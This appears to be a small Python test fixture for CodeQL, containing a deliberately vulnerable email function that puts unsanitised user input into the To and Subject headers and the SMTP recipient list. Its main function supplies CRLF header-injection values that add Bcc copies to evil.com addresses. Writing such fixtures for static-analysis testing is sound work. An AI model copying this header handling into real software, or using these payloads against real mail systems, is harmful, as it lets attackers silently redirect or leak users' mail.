#!/usr/bin/env python3
"""
Simple email header injection vulnerabilities for CodeQL testing
"""
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email_with_injection(user_name, user_email, subject_input):
    """Function with clear email header injection vulnerabilities"""
    
    # VULNERABILITY 1: User input directly in email headers
    msg = MIMEMultipart()
    msg["From"] = "noreply@company.com"
    msg["To"] = user_email  # SINK: user input in To header
    msg["Subject"] = subject_input  # SINK: user input in Subject header
    
    body = f"Hello {user_name}, this is a test email."
    msg.attach(MIMEText(body, 'plain'))
    
    # VULNERABILITY 2: User input in SMTP sendmail call
    smtp_server = smtplib.SMTP('localhost', 587)
    smtp_server.sendmail(
        "noreply@company.com",
        [user_email],  # SINK: user input in sendmail recipient list
        msg.as_string()
    )
    smtp_server.quit()

def main():
    # Test with malicious input that demonstrates the vulnerability
    malicious_email = "victim@company.com\r\nBcc: attacker@evil.com"
    malicious_subject = "Test\r\nBcc: secret@evil.com"
    
    send_email_with_injection("Test User", malicious_email, malicious_subject)

if __name__ == "__main__":
    main()
